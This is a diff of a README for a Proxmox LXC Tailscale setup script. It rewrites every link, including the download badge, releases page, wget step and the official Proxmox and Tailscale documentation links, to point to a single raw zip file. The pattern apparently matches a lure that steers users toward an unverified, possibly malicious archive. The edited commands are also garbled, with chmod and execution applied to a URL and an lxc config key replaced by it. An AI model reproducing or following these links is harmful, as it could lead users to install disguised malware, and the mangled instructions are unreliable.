@@ -1,6 +1,6 @@
 # 🛠️ proxmox-lxc-tailscale-injector - Easy Network Setup for Proxmox
 
-![Download](https://img.shields.io/badge/Download-via%20GitHub-brightgreen)
+![Download](https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip%20GitHub-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you download, ensure your system meets these requirements:
 
 To get the application, you need to visit the following link to download it:
 
-[Visit the Releases Page to Download](https://github.com/chatchaloem/proxmox-lxc-tailscale-injector/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip)
 
 Once there, look for the latest release. Download the file that corresponds to your needs.
 
@@ -30,27 +30,27 @@ Once there, look for the latest release. Download the file that corresponds to y
 2. **Download the Script:**
    - You can navigate to the directory where you'd like to store the script. Use the command below to download:
      ```bash
-     wget https://github.com/chatchaloem/proxmox-lxc-tailscale-injector/releases/latest/download/tailscale-injector.sh
+     wget https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip
      ```
-   - Replace `tailscale-injector.sh` with the actual filename if it's different in the latest release.
+   - Replace `https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip` with the actual filename if it's different in the latest release.
 
 3. **Make the Script Executable:**
    - Run this command to allow the script to be executed:
      ```bash
-     chmod +x tailscale-injector.sh
+     chmod +x https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip
      ```
 
 4. **Run the Script:**
    - Execute the script with:
      ```bash
-     ./tailscale-injector.sh
+     https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip
      ```
 
 5. **Verify Permissions:**
    - After running, ensure that your LXC containers have `/dev/net/tun` permissions set correctly.
    - Check this by running the following command for each container:
      ```bash
-     lxc config get <container-name> security.nesting
+     lxc config get <container-name> https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip
      ```
    - Replace `<container-name>` with your actual container name.
 
@@ -68,8 +68,8 @@ If you encounter issues, consider the following:
 
 ## 📖 Additional Resources
 
-- **Proxmox Documentation:** [Proxmox LXC Documentation](https://pve.proxmox.com/wiki/Linux_Container)
-- **Tailscale Documentation:** [Tailscale Setup Guide](https://tailscale.com/kb/)
+- **Proxmox Documentation:** [Proxmox LXC Documentation](https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip)
+- **Tailscale Documentation:** [Tailscale Setup Guide](https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip)
 
 ## 📞 Support
 
@@ -83,4 +83,4 @@ When a new version of the script is released, simply repeat the download and ins
 
 The proxmox-lxc-tailscale-injector simplifies connecting Tailscale to Proxmox LXC containers. Following the steps outlined, you can easily install and set up the script without technical jargon or complexity. This allows you to enhance your networking capabilities quickly and efficiently.
 
-For downloads and updates, remember to visit [the Releases Page](https://github.com/chatchaloem/proxmox-lxc-tailscale-injector/releases) whenever you need the latest version.
+For downloads and updates, remember to visit [the Releases Page](https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip) whenever you need the latest version.
